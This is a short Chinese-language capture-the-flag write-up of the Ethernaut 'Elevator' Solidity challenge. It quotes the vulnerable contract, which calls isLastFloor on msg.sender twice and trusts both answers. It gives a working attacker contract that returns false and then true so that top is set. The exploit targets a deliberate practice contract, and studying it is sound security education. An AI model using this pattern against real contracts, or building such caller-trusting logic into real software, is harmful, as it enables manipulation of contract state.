# Elevator

## 要求

```
电梯不会让你达到大楼顶部, 对吧?

这可能有帮助:
有的时候 solidity 不是很擅长保存 promises.
这个 电梯 期待被用在一个 建筑 里.
```

## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## 分析

这个也没啥，就是伪造一个有`function isLastFloor(uint256) external returns (bool)`的函数

## pwn


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Elevator{
    bool status;
    address _target;
    constructor(address target_){
        status = true;
        _target=target_;
    }

    function isLastFloor(uint256 f) external returns (bool){
        if(status){
            status =false;
            return false;
        }
        return true;
    }
    function pwn() public{
        address(_target).call(abi.encodeWithSignature("goTo(uint256)", 10));
    }
}
```